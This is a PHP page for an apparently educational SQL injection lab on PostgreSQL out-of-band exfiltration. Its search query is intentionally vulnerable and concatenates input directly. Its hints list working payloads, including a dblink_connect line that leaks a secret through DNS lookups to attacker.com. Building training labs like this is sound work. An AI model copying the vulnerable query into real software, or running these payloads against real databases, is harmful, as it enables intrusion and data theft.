<?php
require_once __DIR__ . '/../../includes/db.php';

$mode = $_GET['mode'] ?? 'black';
$verify_error = null;

/* =====================
   FLAG VERIFY
===================== */
if (isset($_POST['flag_field'])) {
    $submitted = $_POST['flag_field'];

    $res = pg_query($conn, "SELECT vault_secret FROM vault LIMIT 1");
    $row = pg_fetch_assoc($res);

    if ($row && $submitted === $row['vault_secret']) {
        $_SESSION['pgsql_lab11_solved'] = true;
        header("Location: " . url_lab_from_slug("pgsql/lab11", $mode));
        exit;
    } else {
        $verify_error = "Incorrect. Keep trying!";
    }
}
?>

<!-- Lab Description -->
<div class="card">
    <h3>Lab 11. OOB: dblink + DNS Exfiltration</h3>

    <h4>Scenario</h4>
    <p>
        An inventory search page allows users to look up items by name. The input is
        concatenated directly into the SQL query. The application supports
        <strong>stacked queries</strong> (multiple statements separated by semicolons).
    </p>
    <p>
        A hidden <code>vault</code> table holds a secret value. In a real attack,
        PostgreSQL's <code>dblink</code> extension can be used to exfiltrate data via
        DNS lookups: the attacker embeds stolen data as a DNS subdomain. For this lab,
        extract the flag using <strong>stacked queries + CAST error-based extraction</strong>.
        The solution walkthrough explains the full dblink DNS exfiltration technique.
    </p>

    <h4>Objective</h4>
    <p>
        Extract the <strong>vault_secret</strong> from the <code>vault</code> table.
        Submit it below to solve the lab.
    </p>

    <h4>Hints</h4>
    <span class="hint-toggle" data-hint="hint1">&#128161; Click for hints</span>
    <div id="hint1" class="hint-content">
        1. Try searching for <code>Mouse</code>: does it return results?<br>
        2. Test injection: <code>Mouse' AND 1=1 -- -</code><br>
        3. CAST error extraction: <code>' AND 1=CAST((SELECT vault_secret FROM vault LIMIT 1) AS INTEGER) -- -</code><br>
        4. Stacked query test: <code>'; SELECT pg_sleep(2) -- -</code> (notice the delay)<br>
        5. Advanced concept: <code>'; SELECT dblink_connect('host='||(SELECT vault_secret FROM vault LIMIT 1)||'.attacker.com dbname=x') -- -</code>
    </div>
</div>

<!-- Verify Flag -->
<div class="card">
    <h4>Submit Vault Secret</h4>
    <form method="POST" class="form-row">
<input type="text" name="flag_field" class="input" placeholder="Enter the vault secret..." required>
        <button type="submit" class="btn btn-primary">Verify</button>
    </form>

    <?php if ($verify_error): ?>
        <div class="result-error result-box"><?= htmlspecialchars($verify_error) ?></div>
    <?php endif; ?>
</div>

<!-- Solved Banner -->
<?php if (!empty($_SESSION['pgsql_lab11_solved'])): ?>

<div class="solved-banner">
    <span class="solved-icon">&#127942;</span>
    <div>
        <div class="solved-title">Lab Solved!</div>
        <div class="solved-desc">You successfully extracted the vault secret and understand the dblink DNS exfiltration technique.</div>
    </div>
</div>

<?php else: ?>

<!-- Vulnerable Query Interface -->
<div class="card">
    <h4>Inventory Search</h4>
    <form method="POST" class="form-row">
<input type="text" name="item" class="input" placeholder="Search items (try: Mouse)" value="<?= htmlspecialchars($_POST['item'] ?? '') ?>">
        <button type="submit" class="btn btn-primary">Search</button>
    </form>
</div>

<?php
if (isset($_POST['item'])) {
    $item = $_POST['item'];

    // INTENTIONALLY VULNERABLE: direct string concatenation, stacked queries supported
    $query = "SELECT id, item_name, quantity FROM inventory WHERE item_name ILIKE '%$item%'";

    // Show the executed query
    echo '<div class="terminal">';
    echo '  <div class="terminal-header">';
    echo '    <span class="terminal-dot red"></span>';
    echo '    <span class="terminal-dot yellow"></span>';
    echo '    <span class="terminal-dot green"></span>';
    echo '    <span class="terminal-title">PostgreSQL Query</span>';
    echo '  </div>';
    echo '  <div class="terminal-body" data-highlight="sql">';
    echo '    <span class="prompt">pgsql&gt; </span>' . htmlspecialchars($query);
    echo '  </div>';
    echo '</div>';

    // Execute query: pg_query supports stacked queries natively
    $result = @pg_query($conn, $query);

    if ($result && pg_num_rows($result) > 0) {
        echo '<div class="result-data result-box">';
        echo '<table class="result-table"><tr><th>ID</th><th>Item</th><th>Quantity</th></tr>';
        while ($row = pg_fetch_assoc($result)) {
            echo '<tr>';
            echo '<td>' . htmlspecialchars($row['id'] ?? '') . '</td>';
            echo '<td>' . htmlspecialchars($row['item_name'] ?? '') . '</td>';
            echo '<td>' . htmlspecialchars($row['quantity'] ?? '') . '</td>';
            echo '</tr>';
        }
        echo '</table></div>';
    } elseif ($result) {
        echo '<div class="result-warning result-box">No items found matching your search.</div>';
    } else {
        $err = pg_last_error($conn);
        echo '<div class="result-error result-box"><strong>Query Error:</strong> ' . htmlspecialchars($err) . '</div>';
    }
}
?>

<?php endif; ?>
